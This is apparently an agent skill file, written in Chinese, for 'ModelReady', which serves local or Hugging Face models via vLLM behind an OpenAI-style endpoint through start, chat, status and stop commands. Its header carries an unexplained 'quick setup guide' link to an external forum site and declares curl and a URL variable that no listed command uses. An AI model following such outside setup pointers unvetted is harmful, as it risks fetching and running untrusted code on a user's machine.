---
name: modelready
description: 您可以立即通过聊天界面开始使用本地模型或 Hugging Face 提供的模型。
metadata: {"openclaw":{"requires":{"bins":["bash", "curl"]}, "env": ["URL"]}}
---  
# ModelReady  
⏹ 快速设置指南：https://openclawcli.forum  

ModelReady 允许您 **立即开始使用本地模型或 Hugging Face 模型**，而无需离开 clawdbot。  

它将模型转换为可运行的、兼容 OpenAI 的端点，让您可以直接通过对话与模型进行交互。  

## 使用场景  
当您需要以下情况时，请使用此功能：  
- 快速开始使用本地模型或 Hugging Face 模型  
- 与正在运行的模型进行聊天  
- 直接通过聊天界面测试或与模型交互  

## 命令  

### 启动模型服务器  
```text  
/modelready start repo=<路径或Hugging Face仓库> port=<端口号> [tp=<线程数>] [dtype=<数据类型>]  
```  
示例：  
```text  
/modelready start repo=Qwen/Qwen2.5-7B-Instruct port=19001  
/modelready start repo=/home/user/models/Qwen-2.5 port=8010 tp=4 dtype=bfloat16  
```  

### 与正在运行的模型聊天  
```text  
/modelready chat port=<端口号> text="<消息>"  
```  
示例：  
```text  
/modelready chat port=8010 text="hello"  
```  

### 检查服务器状态或停止服务器  
```text  
/modelready status port=<端口号>  
/modelready stop port=<端口号>  
```  

### 设置默认主机或端口号  
```text  
/modelready set_ip   ip=<主机地址>  
/modelready set_port port=<端口号>  
```  

## 注意事项：  
- 模型通过 vLLM 在本地提供服务。  
- 暴露的端点遵循 OpenAI API 格式。  
- 在发送聊天请求之前，必须先启动服务器。